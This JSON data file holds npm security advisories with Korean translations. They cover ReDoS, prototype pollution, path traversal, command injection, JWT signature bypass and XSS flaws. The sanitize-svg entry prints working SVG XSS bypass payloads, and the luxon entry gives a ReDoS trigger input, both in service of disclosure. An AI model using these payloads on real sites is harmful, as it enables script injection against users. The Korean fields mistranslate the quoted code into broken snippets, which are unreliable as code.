    "descriptionKR": "Okta OIDC 미들웨어 버전 5.0.0 이전에는 공격자가 사용자를 임의의 URL로 리디렉션할 수 있는 개방형 리디렉션 취약성이 존재합니다.\n\n**영향을 받는 제품 및 버전**\n버전 5.0.0 이전의 Okta OIDC 미들웨어.\n\n**해결**\n이 취약점은 OIDC 미들웨어 5.0.0에서 수정되었습니다. 이 취약성을 해결하려면 Okta OIDC 미들웨어를 이 버전 이상으로 업그레이드하십시오.\n\n**CVE 세부 정보**\n**CVE ID:** [CVE-2022-3145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-3145)\n**게시일:** 2023년 1월 5일\n**취약점 유형:** Open Redirect\n**CWE:** CWE-601\n**CVSS v3.1 점수:** 4.3\n**심각도:** 보통\n**벡터 문자열:** AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N\n\n**심각도 세부정보**\n이 문제를 악용하려면 공격자는 자신이 제어하는 ​​대상 서버가 포함된 잘못된 형식의 URL을 피해자에게 보내야 합니다. 사용자가 성공적으로 로그인 프로세스를 완료하면 피해자 사용자는 공격자가 제어하는 ​​사이트로 리디렉션됩니다.\n\n**참조**\nhttps://github.com/okta/okta-oidc-middleware"
  },
  {
    "description": "A vulnerability was found in Woorank robots-txt-guard. It has been rated as problematic. Affected by this issue is the function makePathPattern of the file lib/patterns.js. The manipulation of the argument pattern leads to inefficient regular expression complexity. The exploit has been disclosed to the public and may be used. The name of the patch is c03827cd2f9933619c23894ce7c98401ea824020. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-217448.",
    "identifiers": "GHSA : GHSA-6g33-8w2q-4hxv\nCVE : CVE-2021-4305",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:09Z",
    "publishedAt": "2023-01-05T12:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4305\nhttps://github.com/Woorank/robots-txt-guard/pull/4\nhttps://github.com/Woorank/robots-txt-guard/commit/c03827cd2f9933619c23894ce7c98401ea824020\nhttps://vuldb.com/?ctiid.217448\nhttps://vuldb.com/?id.217448\nhttps://github.com/advisories/GHSA-6g33-8w2q-4hxv",
    "name": "robots-txt-guard",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.2",
    "identifier": "1.0.2",
    "descriptionKR": "Woorank robots-txt-guard에서 취약점이 발견되었습니다. 문제가 있는 것으로 평가되었습니다. 이 문제의 영향을 받는 것은 lib/patterns.js 파일의 makePathPattern 함수입니다. 인수 패턴을 조작하면 비효율적인 정규식이 복잡해집니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 패치의 이름은 c03827cd2f9933619c23894ce7c98401ea824020입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 식별자는 VDB-217448입니다."
  },
  {
    "description": "A vulnerability classified as problematic has been found in cronvel tree-kit up to 0.6.x. This affects an unknown part. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). Upgrading to version 0.7.0 is able to address this issue. The name of the patch is a63f559c50d70e8cb2eaae670dec25d1dbc4afcd. It is recommended to upgrade the affected component. The identifier VDB-216765 was assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-mw4x-g2x8-qcvf\nCVE : CVE-2021-4278",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:01:18Z",
    "publishedAt": "2022-12-25T18:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4278\nhttps://github.com/cronvel/tree-kit/commit/a63f559c50d70e8cb2eaae670dec25d1dbc4afcd\nhttps://github.com/cronvel/tree-kit/releases/tag/v0.7.0\nhttps://vuldb.com/?ctiid.216765\nhttps://vuldb.com/?id.216765\nhttps://github.com/advisories/GHSA-mw4x-g2x8-qcvf",
    "name": "tree-kit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.0",
    "identifier": "0.7.0",
    "descriptionKR": "cronvel tree-kit 0.6.x까지 문제성으로 분류된 취약점이 발견되었습니다. 알 수 없는 부분에 영향을 미칩니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 버전 0.7.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 a63f559c50d70e8cb2eaae670dec25d1dbc4afcd입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-216765가 이 취약점에 할당되었습니다."
  },
  {
    "description": "# Impact\nLuxon's `DateTime.fromRFC2822() has quadratic (N^2) complexity on some specific inputs. This causes a noticeable slowdown for inputs with lengths above 10k characters. Users providing untrusted data to this method are therefore vulnerable to (Re)DoS attacks.\n\nThis is the same bug as Moment's https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\n\n# Workarounds\nLimit the length of the input.\n\n# References\nThere is an excellent writeup of the same issue in Moment: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# Details\n`DateTime.fromRFC2822(\"(\".repeat(500000))` takes a couple minutes to complete.",
    "identifiers": "GHSA : GHSA-3xq5-wjfh-ppjc\nCVE : CVE-2023-22467",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:01:41Z",
    "publishedAt": "2023-01-09T14:10:49Z",
    "references": "https://github.com/moment/luxon/security/advisories/GHSA-3xq5-wjfh-ppjc\nhttps://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22467\nhttps://github.com/moment/moment/pull/6015#issuecomment-1152961973\nhttps://github.com/moment/luxon/commit/5ab3bf64a10da929a437629cdb2f059bb83212bf\nhttps://github.com/advisories/GHSA-3xq5-wjfh-ppjc",
    "name": "luxon",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.2.1",
    "identifier": "3.2.1",
    "descriptionKR": "# 영향\nLuxon의 `DateTime.fromRFC2822()는 일부 특정 입력에서 2차(N^2) 복잡도를 가집니다. 이로 인해 길이가 10k 문자를 초과하는 입력의 경우 눈에 띄게 속도가 느려집니다. 따라서 이 방법에 신뢰할 수 없는 데이터를 제공하는 사용자는 (Re)DoS 공격에 취약합니다.\n\nMoment의 https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g와 동일한 버그입니다.\n\n# 해결 방법\n입력 길이를 제한합니다.\n\n# 참조\nMoment에 같은 문제에 대한 훌륭한 글이 있습니다: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# 세부사항\n`DateTime.fromRFC2822(\"(\".repeat(500000))`는 완료하는 데 몇 분 정도 걸립니다."
  },
  {
    "description": "# Impact\nLuxon's `DateTime.fromRFC2822() has quadratic (N^2) complexity on some specific inputs. This causes a noticeable slowdown for inputs with lengths above 10k characters. Users providing untrusted data to this method are therefore vulnerable to (Re)DoS attacks.\n\nThis is the same bug as Moment's https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\n\n# Workarounds\nLimit the length of the input.\n\n# References\nThere is an excellent writeup of the same issue in Moment: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# Details\n`DateTime.fromRFC2822(\"(\".repeat(500000))` takes a couple minutes to complete.",
    "identifiers": "GHSA : GHSA-3xq5-wjfh-ppjc\nCVE : CVE-2023-22467",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:01:41Z",
    "publishedAt": "2023-01-09T14:10:49Z",
    "references": "https://github.com/moment/luxon/security/advisories/GHSA-3xq5-wjfh-ppjc\nhttps://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22467\nhttps://github.com/moment/moment/pull/6015#issuecomment-1152961973\nhttps://github.com/moment/luxon/commit/5ab3bf64a10da929a437629cdb2f059bb83212bf\nhttps://github.com/advisories/GHSA-3xq5-wjfh-ppjc",
    "name": "luxon",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.5.2",
    "identifier": "2.5.2",
    "descriptionKR": "# 영향\nLuxon의 `DateTime.fromRFC2822()는 일부 특정 입력에서 2차(N^2) 복잡도를 가집니다. 이로 인해 길이가 10k 문자를 초과하는 입력의 경우 눈에 띄게 속도가 느려집니다. 따라서 이 방법에 신뢰할 수 없는 데이터를 제공하는 사용자는 (Re)DoS 공격에 취약합니다.\n\nMoment의 https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g와 동일한 버그입니다.\n\n# 해결 방법\n입력 길이를 제한합니다.\n\n# 참조\nMoment에 같은 문제에 대한 훌륭한 글이 있습니다: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# 세부사항\n`DateTime.fromRFC2822(\"(\".repeat(500000))`는 완료하는 데 몇 분 정도 걸립니다."
  },
  {
    "description": "# Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don’t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.\n",
    "identifiers": "GHSA : GHSA-qwph-4952-7xr6\nCVE : CVE-2022-23540",
    "severity": "MODERATE",
    "updatedAt": "2023-07-14T22:03:14Z",
    "publishedAt": "2022-12-22T03:32:59Z",
    "references": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-qwph-4952-7xr6\nhttps://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23540\nhttps://github.com/advisories/GHSA-qwph-4952-7xr6",
    "name": "jsonwebtoken",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.0.0",
    "identifier": "9.0.0",
    "descriptionKR": "# 개요\n\njsonwebtoken 라이브러리의 버전 <=8.5.1에서는 알고리즘 정의가 부족하고 `jwt.verify()` 함수의 잘못된 비밀 또는 키가 서명 확인을 위한 `none` 알고리즘으로 기본 설정되어 서명 검증 우회로 이어질 수 있습니다.\n\n# 영향을 받나요?\n`jwt.verify()` 함수에서 다음이 모두 참인 경우 영향을 받습니다.\n- 서명이 없는 토큰이 수신됨\n- 알고리즘이 지정되지 않음\n- 허위(예: null, false, undefined) 비밀 또는 키가 전달됨\n\n# 어떻게 고칠 수 있나요?\n \n`jwt.verify()` 메서드에서 없음 알고리즘에 대한 기본 지원을 제거하는 버전 9.0.0으로 업데이트합니다.\n\n# 수정 사항이 내 사용자에게 영향을 미칩니까?\n\n버전 9.0.0으로 업데이트하고 `none` 알고리즘을 허용할 필요가 없으면 아무런 영향이 없습니다. '없음' 알고리즘이 필요한 경우에는 `jwt.verify()` 옵션에서 명시적으로 지정해야 합니다."
  },
  {
    "description": "A vulnerability was found in email-existence. It has been rated as problematic. Affected by this issue is some unknown functionality of the file `index.js`. The manipulation leads to inefficient regular expression complexity. The name of the patch is 0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56. It is recommended to apply a patch to fix this issue. VDB-216854 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-p27h-4cpf-fw48\nCVE : CVE-2018-25049",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:28Z",
    "publishedAt": "2022-12-27T09:30:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25049\nhttps://github.com/nmanousos/email-existence/pull/37\nhttps://github.com/nmanousos/email-existence/commit/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56\nhttps://vuldb.com/?ctiid.216854\nhttps://vuldb.com/?id.216854\nhttps://github.com/advisories/GHSA-p27h-4cpf-fw48",
    "name": "email-existence",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.6",
    "descriptionKR": "이메일 존재에서 취약점이 발견되었습니다. 문제가 있는 것으로 평가되었습니다. 이 문제의 영향을 받는 것은 `index.js` 파일의 일부 알려지지 않은 기능입니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 패치의 이름은 0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. VDB-216854는 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "A vulnerability classified as critical was found in SimbCo httpster. This vulnerability affects the function fs.realpathSync of the file src/server.coffee. The manipulation leads to path traversal. The exploit has been disclosed to the public and may be used. The name of the patch is d3055b3e30b40b65d30c5a06d6e053dffa7f35d0. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-216748.\n\n",
    "identifiers": "GHSA : GHSA-p8j8-wxvp-h695\nCVE : CVE-2020-36629",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:01:18Z",
    "publishedAt": "2022-12-25T12:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36629\nhttps://github.com/SimbCo/httpster/pull/36\nhttps://github.com/SimbCo/httpster/commit/d3055b3e30b40b65d30c5a06d6e053dffa7f35d0\nhttps://vuldb.com/?id.216748\nhttps://github.com/advisories/GHSA-p8j8-wxvp-h695",
    "name": "httpster",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "심각으로 분류된 취약점이 SimbCo httpster에서 발견되었습니다. 이 취약점은 src/server.coffee 파일의 fs.realpathSync 기능에 영향을 미칩니다. 조작은 경로 통과로 이어집니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 패치의 이름은 d3055b3e30b40b65d30c5a06d6e053dffa7f35d0입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 식별자는 VDB-216748입니다."
  },
  {
    "description": "window-control is an npm package that provides tools to manage window focus. Versions before 1.4.5 are vulnerable to Command Injection via the `sendKeys` function due to improper input sanitization.",
    "identifiers": "GHSA : GHSA-9mjx-wfqp-j5ph\nCVE : CVE-2022-25926",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:32Z",
    "publishedAt": "2023-01-04T18:30:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25926\nhttps://github.com/bruno-robert/window-control/commit/075c854534a749d887655a906759f5a7eee95173\nhttps://github.com/bruno-robert/window-control/releases/tag/v1.4.5\nhttps://security.snyk.io/vuln/SNYK-JS-WINDOWCONTROL-3186345\nhttps://github.com/advisories/GHSA-9mjx-wfqp-j5ph",
    "name": "window-control",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.4.5",
    "identifier": "1.4.5",
    "descriptionKR": "window-control은 창 포커스를 관리하는 도구를 제공하는 npm 패키지입니다. 1.4.5 이전 버전은 부적절한 입력 삭제로 인해 `sendKeys` 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "### Impact\nThe *sanitize-svg* package uses a deny-list-pattern to sanitize SVGs to prevent cross-site scripting (XSS). In doing so, literal `<script>`-tags and on-event handlers were detected:\n```typescript\n[...]\n  const svgEl = div.firstElementChild!\n  const attributes = Array.from(svgEl.attributes).map(({ name }) => name)\n  const hasScriptAttr = !!attributes.find((attr) => attr.startsWith('on'))\n  const scripts = svgEl.getElementsByTagName('script')\n  return scripts.length === 0 && !hasScriptAttr ? svg : null\n[...]\n```\n\nThere are more ways to embed JavaScript in XML files.\n\n**Anchor Tag** (requires user to click link):\n```xml\n<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\">\n  <a href=\"javascript:alert(document.domain)\">\n    <text x=\"50\" y=\"50\" text-anchor=\"middle\">Lauritz</text>\n  </a>\n</svg>\n```\n\n**Foreign Object Tag** (no user interaction required):\n```xml\n<svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n        <text x=\"20\" y=\"35\">Lauritz</text>\n        <foreignObject width=\"500\" height=\"500\">\n                <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:confirm(document.domain);\" width=\"400\" height=\"250\"/>\n        </foreignObject>\n</svg>\n```\n\nAs a result, downstream software that relies on `sanitize-svg` and expects resulting SVGs to be safe, may be vulnerable to XSS. We are aware of at least one downstream project for which this vulnerability had security implications. \n\n### Patches\nThis vulnerability was addressed in v0.4.0.\n\n### Workarounds\nN/A",
    "identifiers": "GHSA : GHSA-h857-2g56-468g\nCVE : CVE-2023-22461",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:01:18Z",
    "publishedAt": "2023-01-05T12:18:35Z",
    "references": "https://github.com/mattkrick/sanitize-svg/security/advisories/GHSA-h857-2g56-468g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22461\nhttps://github.com/mattkrick/sanitize-svg/commit/b107e453ede7b58adcccae74a3e474c012eec85d\nhttps://github.com/advisories/GHSA-h857-2g56-468g",
    "name": "@mattkrick/sanitize-svg",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.3.1",
    "identifier": "0.4.0",
    "descriptionKR": "### 영향\n*sanitize-svg* 패키지는 교차 사이트 스크립팅(XSS)을 방지하기 위해 SVG를 삭제하는 거부 목록 패턴을 사용합니다. 그 과정에서 리터럴 `<script>`-태그와 온 이벤트 핸들러가 감지되었습니다.\n```타입스크립트\n[...]\n  const svgEl = div.firstElementChild!\n  const 속성 = Array.from(svgEl.attributes).map(({ 이름 }) => 이름)\n  const hasScriptAttr = !!attributes.find((attr) => attr.startsWith('on'))\n  const 스크립트 = svgEl.getElementsByTagName('스크립트')\n  반환 scripts.length === 0 && !hasScriptAttr ? svg : null\n[...]\n```\n\nXML 파일에 JavaScript를 임베드하는 더 많은 방법이 있습니다.\n\n**앵커 태그**(사용자가 링크를 클릭해야 함):\n```xml\n<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\">\n  <a href=\"javascript:alert(문서.도메인)\">\n    <text x=\"50\" y=\"50\" text-anchor=\"middle\">로리츠</text>\n  </a>\n</svg>\n```\n\n**외부 개체 태그**(사용자 상호 작용 필요 없음):\n```xml\n<svg 너비=\"500\" 높이=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n        <text x=\"20\" y=\"35\">로리츠</text>\n        <foreignObject 폭=\"500\" 높이=\"500\">\n                <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:confirm(문서.도메인);\" 폭=\"400\" 높이=\"250\"/>\n        </foreignObject>\n</svg>\n```\n\n결과적으로 `sanitize-svg`에 의존하고 결과 SVG가 안전할 것으로 기대하는 다운스트림 소프트웨어는 XSS에 취약할 수 있습니다. 우리는 이 취약점이 보안에 영향을 미치는 하나 이상의 다운스트림 프로젝트를 알고 있습니다.\n\n### 패치\n이 취약점은 v0.4.0에서 해결되었습니다.\n\n### 해결 방법\n해당 없음"
  },
  {
    "description": "A vulnerability classified as problematic was found in cronvel string-kit up to 0.12.7. This vulnerability affects the function naturalSort of the file lib/naturalSort.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. Upgrading to version 0.12.8 can address this issue. The name of the patch is 9cac4c298ee92c1695b0695951f1488884a7ca73. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-217180.",
    "identifiers": "GHSA : GHSA-pfrm-4rjw-g9q5\nCVE : CVE-2021-4299",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:30Z",
    "publishedAt": "2023-01-02T09:31:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4299\nhttps://github.com/cronvel/string-kit/commit/9cac4c298ee92c1695b0695951f1488884a7ca73\nhttps://github.com/cronvel/string-kit/releases/tag/v0.12.8\nhttps://vuldb.com/?ctiid.217180\nhttps://vuldb.com/?id.217180\nhttps://github.com/advisories/GHSA-pfrm-4rjw-g9q5",
    "name": "string-kit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.12.8",
    "identifier": "0.12.8",
    "descriptionKR": "문제로 분류된 취약점이 cronvel string-kit 0.12.7까지 발견되었습니다. 이 취약점은 lib/naturalSort.js 파일의 naturalSort 기능에 영향을 미칩니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 공격은 원격으로 시작할 수 있습니다. 버전 0.12.8로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 9cac4c298ee92c1695b0695951f1488884a7ca73입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 식별자는 VDB-217180입니다."
  },
  {
    "description": "A vulnerability was found in rgb2hex up to 0.1.5. It has been rated as problematic. This issue affects some unknown processing. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely. Upgrading to version 0.1.6 can address this issue. The name of the patch is 9e0c38594432edfa64136fdf7bb651835e17c34f. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217151.",
    "identifiers": "GHSA : GHSA-7599-fqgm-v84p\nCVE : CVE-2018-25061",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:30Z",
    "publishedAt": "2022-12-31T21:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25061\nhttps://github.com/christian-bromann/rgb2hex/commit/9e0c38594432edfa64136fdf7bb651835e17c34f\nhttps://github.com/christian-bromann/rgb2hex/releases/tag/v0.1.6\nhttps://vuldb.com/?ctiid.217151\nhttps://vuldb.com/?id.217151\nhttps://github.com/advisories/GHSA-7599-fqgm-v84p",
    "name": "rgb2hex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.1.6",
    "identifier": "0.1.6",
    "descriptionKR": "rgb2hex 0.1.5까지 취약점이 발견되었습니다. 문제가 있는 것으로 평가되었습니다. 이 문제는 일부 알 수 없는 처리에 영향을 미칩니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 공격은 원격으로 시작될 수 있습니다. 버전 0.1.6으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 9e0c38594432edfa64136fdf7bb651835e17c34f입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-217151입니다."
  },
  {
    "description": "A vulnerability, which was classified as critical, has been found in json-pointer. Affected by this issue is the function set of the file index.js. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack may be launched remotely. The name of the patch is 859c9984b6c407fc2d5a0a7e47c7274daa681941. It is recommended to apply a patch to fix this issue. VDB-216794 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-6xrf-q977-5vgc\nCVE : CVE-2022-4742",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:01:30Z",
    "publishedAt": "2022-12-26T09:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-4742\nhttps://github.com/manuelstofer/json-pointer/pull/36\nhttps://github.com/manuelstofer/json-pointer/commit/859c9984b6c407fc2d5a0a7e47c7274daa681941\nhttps://vuldb.com/?ctiid.216794\nhttps://vuldb.com/?id.216794\nhttps://github.com/advisories/GHSA-6xrf-q977-5vgc",
    "name": "json-pointer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.2",
    "identifier": "0.6.2",
    "descriptionKR": "json-pointer에서 critical로 분류된 취약점이 발견되었습니다. 이 문제의 영향을 받는 것은 index.js 파일의 기능 세트입니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 공격은 원격으로 시작할 수 있습니다. 패치 이름은 859c9984b6c407fc2d5a0a7e47c7274daa681941입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. VDB-216794는 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "flat helps flatten/unflatten nested Javascript objects. A vulnerability, which was classified as critical, was found in hughsk flat up to 5.0.0. This affects the function unflatten of the file index.js. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). It is possible to initiate the attack remotely. Upgrading to version 5.0.1 can address this issue. The name of the patch is 20ef0ef55dfa028caddaedbcb33efbdb04d18e13. It is recommended to upgrade the affected component. The identifier VDB-216777 was assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-2j2x-2gpw-g8fm\nCVE : CVE-2020-36632",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:01:29Z",
    "publishedAt": "2022-12-25T21:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36632\nhttps://github.com/hughsk/flat/issues/105\nhttps://github.com/hughsk/flat/pull/106\nhttps://github.com/hughsk/flat/commit/20ef0ef55dfa028caddaedbcb33efbdb04d18e13\nhttps://github.com/hughsk/flat/releases/tag/5.0.1\nhttps://vuldb.com/?ctiid.216777\nhttps://vuldb.com/?id.216777\nhttps://github.com/advisories/GHSA-2j2x-2gpw-g8fm",
    "name": "flat",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.1",
    "identifier": "5.0.1",
    "descriptionKR": "flat은 중첩된 Javascript 객체를 평면화/평면화 해제하는 데 도움이 됩니다. Hughsk flat 5.0.0까지 치명적인 취약점으로 분류된 취약점이 발견되었습니다. 이는 index.js 파일의 unflatten 함수에 영향을 미칩니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 공격을 원격으로 시작할 수 있습니다. 버전 5.0.1로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 20ef0ef55dfa028caddaedbcb33efbdb04d18e13입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-216777이 이 취약점에 할당되었습니다."
  },
  {
    "description": "A vulnerability was found in markdown-it up to 2.x. It has been classified as problematic. Affected is an unknown function of the file `lib/common/html_re.js`. The manipulation leads to inefficient regular expression complexity. Upgrading to version 3.0.0 is able to address this issue. The name of the patch is 89c8620157d6e38f9872811620d25138fc9d1b0d. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216852.",
    "identifiers": "GHSA : GHSA-j5p7-jf4q-742q\nCVE : CVE-2015-10005",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:29Z",
    "publishedAt": "2022-12-27T09:30:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2015-10005\nhttps://github.com/markdown-it/markdown-it/commit/89c8620157d6e38f9872811620d25138fc9d1b0d\nhttps://github.com/markdown-it/markdown-it/releases/tag/3.0.0\nhttps://vuldb.com/?ctiid.216852\nhttps://vuldb.com/?id.216852\nhttps://github.com/advisories/GHSA-j5p7-jf4q-742q",
    "name": "markdown-it",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.0",
    "identifier": "3.0.0",
    "descriptionKR": "markdown-it 2.x까지 취약점이 발견되었습니다. 문제가 있는 것으로 분류되었습니다. 영향을 받는 것은 `lib/common/html_re.js` 파일의 알 수 없는 기능입니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 버전 3.0.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 89c8620157d6e38f9872811620d25138fc9d1b0d입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 식별자는 VDB-216852입니다."
  },
  {
    "description": "Jodit Editor is a WYSIWYG editor written in pure TypeScript without the use of additional libraries. Jodit Editor is vulnerable to XSS attacks when pasting specially constructed input. This issue has not been fully patched. There are no known workarounds.",
    "identifiers": "GHSA : GHSA-42hx-vrxx-5r6v\nCVE : CVE-2022-23461",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:06:59Z",
    "publishedAt": "2022-09-25T00:00:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-23461\nhttps://securitylab.github.com/advisories/GHSL-2022-030_xdan_jodit/\nhttps://github.com/advisories/GHSA-42hx-vrxx-5r6v",
    "name": "jodit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.24.2",
    "descriptionKR": "Jodit Editor는 추가 라이브러리를 사용하지 않고 순수한 TypeScript로 작성된 WYSIWYG 편집기입니다. Jodit Editor는 특별히 구성된 입력을 붙여넣을 때 XSS 공격에 취약합니다. 이 문제는 완전히 패치되지 않았습니다. 알려진 해결 방법이 없습니다."
  },
  {
    "description": "Json2html is a client side javascript HTML templating library with wrappers for both jQuery and Node.js. A vulnerability was found in moappi Json2html up to 1.1.x and classified as problematic. This issue affects some unknown processing of the file json2html.js. The manipulation leads to cross site scripting. The attack may be initiated remotely. Upgrading to version 1.2.0 can address this issue. The name of the patch is 2d3d24d971b19a8ed1fb823596300b9835d55801. The associated identifier of this vulnerability is VDB-216959.",
    "identifiers": "GHSA : GHSA-79mp-cxp4-9p6r\nCVE : CVE-2018-25053",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:01:33Z",
    "publishedAt": "2022-12-28T12:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25053\nhttps://github.com/moappi/json2html/commit/2d3d24d971b19a8ed1fb823596300b9835d55801\nhttps://github.com/moappi/json2html/releases/tag/1.2.0\nhttps://vuldb.com/?ctiid.216959\nhttps://vuldb.com/?id.216959\nhttps://github.com/advisories/GHSA-79mp-cxp4-9p6r",
    "name": "node-json2html",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.0",
    "identifier": "1.2.0",
